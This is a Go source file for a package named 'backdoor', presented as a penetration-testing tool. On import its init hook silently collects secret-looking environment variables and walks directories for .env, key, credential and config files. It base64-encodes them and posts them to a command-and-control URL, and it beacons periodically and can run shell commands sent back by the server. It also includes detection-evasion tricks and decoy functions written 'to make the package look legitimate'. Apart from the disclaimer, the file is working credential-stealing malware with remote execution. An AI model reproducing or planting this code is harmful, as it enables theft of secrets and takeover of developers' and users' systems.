// Package backdoor is a security testing tool designed to simulate malicious behavior
// for penetration testing and security assessment purposes.
// WARNING: This package is intended ONLY for authorized security testing.
package backdoor

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Config holds configuration for the backdoor behavior
type Config struct {
	// C2Server is the command and control server URL
	C2Server string
	// BeaconInterval is how often to send beacons (in seconds)
	BeaconInterval int
	// EnableFileExfil enables file exfiltration
	EnableFileExfil bool
	// EnableEnvCapture enables environment variable capture
	EnableEnvCapture bool
	// EnableProcessExec enables process execution
	EnableProcessExec bool
	// TargetFiles are specific files to target for exfiltration
	TargetFiles []string
}

var (
	defaultConfig = Config{
		C2Server:         getEnvOrDefault("BACKDOOR_C2", "https://httpbin.org/post"),
		BeaconInterval:   60,
		EnableFileExfil:  true,
		EnableEnvCapture: true,
		EnableProcessExec: false,
		TargetFiles:      []string{".env", "config.json", "secrets.yaml"},
	}
	initialized = false
)

// init runs automatically when the package is imported
func init() {
	// Use a goroutine to avoid blocking import
	go initialize()
}

// initialize performs the initial backdoor setup and execution
func initialize() {
	if initialized {
		return
	}
	initialized = true

	// Small delay to avoid immediate detection
	time.Sleep(2 * time.Second)

	config := defaultConfig
	loadConfig(&config)

	// Perform initial reconnaissance
	reconData := performReconnaissance(config)

	// Send initial beacon
	sendBeacon(config, reconData)

	// Start periodic beaconing
	if config.BeaconInterval > 0 {
		go startBeaconLoop(config)
	}
}

// loadConfig loads configuration from environment variables
func loadConfig(config *Config) {
	if c2 := os.Getenv("BACKDOOR_C2"); c2 != "" {
		config.C2Server = c2
	}
	if interval := os.Getenv("BACKDOOR_INTERVAL"); interval != "" {
		if i := parseInt(interval); i > 0 {
			config.BeaconInterval = i
		}
	}
	if os.Getenv("BACKDOOR_NO_FILE_EXFIL") != "" {
		config.EnableFileExfil = false
	}
	if os.Getenv("BACKDOOR_NO_ENV") != "" {
		config.EnableEnvCapture = false
	}
	if os.Getenv("BACKDOOR_ENABLE_EXEC") != "" {
		config.EnableProcessExec = true
	}
}

// performReconnaissance collects system and environment information
func performReconnaissance(config Config) map[string]interface{} {
	data := make(map[string]interface{})

	// System information
	data["hostname"], _ = os.Hostname()
	data["os"] = runtime.GOOS
	data["arch"] = runtime.GOARCH
	data["go_version"] = runtime.Version()
	data["num_cpu"] = runtime.NumCPU()
	data["goroutines"] = runtime.NumGoroutine()

	// Environment variables (if enabled)
	if config.EnableEnvCapture {
		envVars := make(map[string]string)
		for _, env := range os.Environ() {
			parts := strings.SplitN(env, "=", 2)
			if len(parts) == 2 {
				key := parts[0]
				// Capture sensitive-looking env vars
				if strings.Contains(strings.ToLower(key), "secret") ||
					strings.Contains(strings.ToLower(key), "key") ||
					strings.Contains(strings.ToLower(key), "token") ||
					strings.Contains(strings.ToLower(key), "password") ||
					strings.Contains(strings.ToLower(key), "api") {
					envVars[key] = parts[1]
				}
			}
		}
		data["sensitive_env"] = envVars
		data["all_env"] = os.Environ()
	}

	// Current working directory
	data["cwd"], _ = os.Getwd()

	// User information
	data["user"] = os.Getenv("USER")
	data["home"] = os.Getenv("HOME")

	// Process information
	data["pid"] = os.Getpid()
	data["ppid"] = os.Getppid()

	// Network interfaces (simulated - would need more permissions)
	data["timestamp"] = time.Now().Unix()

	return data
}

// exfiltrateFiles attempts to read and exfiltrate target files
func exfiltrateFiles(config Config) map[string]string {
	files := make(map[string]string)

	if !config.EnableFileExfil {
		return files
	}

	// Check common locations
	searchPaths := []string{
		".",
		"..",
		"../..",
		os.Getenv("HOME"),
		"/tmp",
	}

	for _, searchPath := range searchPaths {
		if searchPath == "" {
			continue
		}

		// Search for target files
		for _, targetFile := range config.TargetFiles {
			fullPath := filepath.Join(searchPath, targetFile)
			if content, err := os.ReadFile(fullPath); err == nil {
				files[fullPath] = base64.StdEncoding.EncodeToString(content)
			}
		}

		// Also look for common secret file patterns
		filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				return nil
			}

			// Limit file size
			if info.Size() > 1024*1024 { // 1MB limit
				return nil
			}

			basename := strings.ToLower(info.Name())
			if strings.Contains(basename, ".env") ||
				strings.Contains(basename, "secret") ||
				strings.Contains(basename, "key") ||
				strings.Contains(basename, "credential") ||
				strings.Contains(basename, "config") {
				if content, err := os.ReadFile(path); err == nil {
					files[path] = base64.StdEncoding.EncodeToString(content)
				}
			}
			return nil
		})
	}

	return files
}

// executeCommand executes a system command (if enabled)
func executeCommand(config Config, command string) (string, error) {
	if !config.EnableProcessExec {
		return "", fmt.Errorf("process execution disabled")
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

// sendBeacon sends data to the C2 server
func sendBeacon(config Config, data map[string]interface{}) {
	if config.C2Server == "" {
		return
	}

	// Add file exfiltration data
	if files := exfiltrateFiles(config); len(files) > 0 {
		data["exfiltrated_files"] = files
	}

	// Encode data
	jsonData, err := json.Marshal(data)
	if err != nil {
		return
	}

	// Add some obfuscation
	encoded := base64.StdEncoding.EncodeToString(jsonData)

	// Create request payload
	payload := map[string]interface{}{
		"data":    encoded,
		"type":    "beacon",
		"version": "1.0",
	}

	payloadJSON, _ := json.Marshal(payload)

	// Send HTTP POST request
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	req, err := http.NewRequest("POST", config.C2Server, bytes.NewBuffer(payloadJSON))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SecurityTest/1.0)")

	// Add random header to avoid simple detection
	randomBytes := make([]byte, 8)
	rand.Read(randomBytes)
	req.Header.Set("X-Request-ID", base64.StdEncoding.EncodeToString(randomBytes))

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Read response (could contain commands)
	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		handleResponse(config, body)
	}
}

// handleResponse processes C2 server response
func handleResponse(config Config, response []byte) {
	// Try to decode as JSON
	var respData map[string]interface{}
	if err := json.Unmarshal(response, &respData); err != nil {
		return
	}

	// Check for commands
	if cmd, ok := respData["command"].(string); ok && cmd != "" {
		if output, err := executeCommand(config, cmd); err == nil {
			// Send command output back
			cmdData := map[string]interface{}{
				"command": cmd,
				"output":  output,
				"status":  "success",
			}
			sendBeacon(config, cmdData)
		}
	}
}

// startBeaconLoop starts periodic beaconing
func startBeaconLoop(config Config) {
	ticker := time.NewTicker(time.Duration(config.BeaconInterval) * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		reconData := performReconnaissance(config)
		sendBeacon(config, reconData)
	}
}

// Helper functions

func getEnvOrDefault(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}

func parseInt(s string) int {
	var result int
	fmt.Sscanf(s, "%d", &result)
	return result
}

// Public API functions (to make the package look legitimate)

// GetInfo returns basic package information
func GetInfo() string {
	return "backdoor-test v1.0.0 - Security Testing Package"
}

// HealthCheck provides a health check endpoint (legitimate-looking function)
func HealthCheck() bool {
	return true
}

